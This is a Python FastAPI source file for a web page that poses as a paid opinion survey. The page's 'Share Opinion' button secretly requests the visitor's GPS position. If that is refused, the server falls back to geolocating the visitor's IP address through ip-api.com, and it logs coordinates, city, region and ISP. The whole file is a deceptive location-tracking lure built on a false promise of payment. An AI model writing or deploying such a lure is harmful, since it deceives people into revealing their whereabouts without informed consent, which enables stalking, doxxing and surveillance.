from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import requests

app = FastAPI()

@app.get("/locate", response_class=HTMLResponse)
def locate_page():
    # This page asks for GPS, falls back to IP
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Share Your Opinion</title>
    </head>
    <body>
        <h2>Click the button to share your Opinion to get paid</h2>
        <button onclick="shareLocation()">Share Opinion</button>

        <script>
        function shareLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        fetch('/gps', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude
                            })
                        }).then(() => alert("Location sent successfully!"));
                    },
                    err => {
                        // Fallback to IP-based
                        fetch('/track').then(() => alert("Location sent (IP-based)!"));
                    }
                );
            } else {
                fetch('/track').then(() => alert("Location sent (IP-based)!"));
            }
        }
        </script>
    </body>
    </html>
    """

@app.get("/track")
def track_ip(request: Request):
    ip = request.client.host
    geo = requests.get(f"http://ip-api.com/json/{ip}").json()

    data = {
        "ip": ip,
        "country": geo.get("country"),
        "region": geo.get("regionName"),
        "city": geo.get("city"),
        "isp": geo.get("isp")
    }

    print("IP LOCATION:", data)
    return {"status": "IP location captured"}

@app.post("/gps")
async def gps_location(data: dict, request: Request):
    ip = request.client.host
    location_data = {
        "ip": ip,
        "latitude": data["lat"],
        "longitude": data["lon"]
    }
    print("GPS LOCATION:", location_data)
    return {"status": "GPS location captured"}

